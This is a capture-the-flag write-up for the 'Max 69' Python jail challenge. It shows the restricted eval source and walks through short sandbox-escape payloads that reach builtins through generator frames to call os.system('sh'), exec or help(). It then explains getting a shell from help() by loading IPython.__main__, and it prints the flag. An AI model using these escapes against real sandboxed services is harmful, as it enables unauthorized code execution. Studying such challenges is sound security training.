---
title: Max 69
tags: [misc, python, pyjail, nordics-ddc-ecsc-2025]
date: 2025-03-17 00:00:01
draft: false
heroImage: ./assets/cyberlandslaget-ddc.png
---

<style>
.basis-1\/5{flex-basis: 5% !important;}
.max-w-prose{max-width: 100ch !important;}
.prose{max-width: 100ch !important;}
</style>

# Max 69

```
English: This challenge is not for the faint of heart! 
Show that you are a python whisperer! 
Feel free to chuckle every time you see a funny number.
```

```python
inp = input('Gimme max 69!\n> ')
if not inp.isascii():
    quit('Give me ascii please')
if '__' in inp:
    quit('No thank you')
if len(inp) > 69:
    quit("Don't give me more than your favourite number")

eval(inp, {'__builtins__':{}}, {'__builtins__':{}})
```

## First thoughts
This is a part 2 of Max 420, but now we have to get it to 69 characters.

Previous solution used was
```python
(y:=[],y.append(z.gi_frame.f_back.f_back.f_builtins[f"{'_'}_import{'_'}_"]("os") for z in y), *[*y[0]][0].system("sh"))
```

which is 119 characters.

help function is often used to get RCE. 

```python
(y:=[],y.append(z.gi_frame.f_back.f_back.f_builtins["help"]() for z in y), *[*y[0]])
```

but changing to call help we get down to 89 

## Doing research

So I spent time trying to find out what others have done as I couldn't get it shorter.
I went into a rabbit hole of trying to understand the scope. 

I won't go so much into details, but I realised the challenge had a "bug"

specific in 
```python
eval(inp, {'__builtins__':{}}, {'__builtins__':{}})
```

correct to limit builtins would be

```python
eval(inp, {'__builtins__':{}}, None)
```

as it really is

```python
eval(inp, globals={'__builtins__':{}}, locals=None)
```

After time I got this working when I changed locals to None

```python
(q:=(q.gi_frame.f_back.f_back.f_builtins['help']()for _ in[0]),[*q])
```

but it does not work with the challenge as local scope is not working properly, so the generator can't access the q variable when it's running. 

I assume this is the point most players would be stuck at.

## Finding the first solution
This section might hurt a bit to people who have spent a lot of time.

I spent a lot of time trying to find a solution and I found this archived challenge "Completely new challenge" on
https://imaginaryctf.org/ArchivedChallenges/58

looking at attachment finds us this

```python
assert ascii(x := input())[1:-1] != x.replace("__","")[:97], eval(x,{'__builtins__':{}},{'__builtins__':{}})
```

where it uses eval in same way and also does not allow __ and 

So i decided to join imaginary ctf discord to see if any more discussion happened.

I searched builtins and found the channel and there were discussion of getting a shorter payload

```python
1in(g:=((g:=g.gi_frame.f_back.f_back.f_builtins)["exec"](g["input"]())for _ in[1]))
```

and this seems to be shortest with 83 and changing it to call help and remove unused brackets, shortens it to 69.

```python
1in(g:=(g:=g.gi_frame.f_back.f_back.f_builtins["help"]()for _ in[1]))
```

It works!


## How to get shell with help?

```
Next part is written as a draft, but added as time is running out.
Will update writeup when I get time.
```

But now is the other part of the challenge how do we get shell in help()? 

Usually this can be done with less/more, but Docker is using socat. So less/more is not used (I believe this is the reason why)

So I spend time trying to see if anything changes when I load in new modules and try to run chal again, but nothing.

So I go around searching through other modules if I can get any info.

Then I try out `sage` because I saw it was installed from before, and yes it's there in the help documentation. I was peeking around and wondering why!

After messing around I see a path to `/usr/bin/python3.13/site-packges/sage`
I started wondering if I could see all site-packges.
So I enter in `site-packages` and that's possible.
I try out a bit more to see if any of them might spawn a shell.

I try out `Jedi` because why not, and then I see a `__main__` as part of Jedi. 

So I type into help 
```
jedi.__main__
```

And there I got kicked out of nc!

Looks like it errored trying to load the file?
I see in docker log and it seems to miss something trying to import.

Could this be a way to get shell?

I open up a local shell to my docker instance and cd to site-packages path and run 

```
find . -type f -name "__main__.py"
```

```bash
./sage/doctest/__main__.py
./sage/repl/ipython_kernel/__main__.py
./jedi/__main__.py
./jedi/inference/compiled/subprocess/__main__.py
./pygments/__main__.py
./IPython/__main__.py
./docutils/__main__.py
./numpy/f2py/__main__.py
./platformdirs/__main__.py
./jupyter_core/__main__.py
./zmq/log/__main__.py
./tornado/test/__main__.py
./ipykernel/__main__.py
./fontTools/__main__.py
./fontTools/cu2qu/__main__.py
./fontTools/designspaceLib/__main__.py
./fontTools/feaLib/__main__.py
./fontTools/merge/__main__.py
./fontTools/mtiLib/__main__.py
./fontTools/otlLib/optimize/__main__.py
./fontTools/qu2cu/__main__.py
./fontTools/subset/__main__.py
./fontTools/ttLib/__main__.py
./fontTools/varLib/__main__.py
./fontTools/varLib/instancer/__main__.py
./PIL/__main__.py
./charset_normalizer/__main__.py
./charset_normalizer/cli/__main__.py
./sphinx/__main__.py
./sphinx/ext/intersphinx/__main__.p
```

and I get this entire list.

From context, it seems like they are files for CLI!

I first tried out the ipython kernel and I got a bit stuck there, nothing useful.
Then I saw IPython and tried that one, and that gave me a shell!

```
IPython.__main__
```
## Flag

```
DDC{w4lK_Th4t_Fr4m3_bUt_h3lP_I_F0rG0t_t0_ch3ck__name__}
```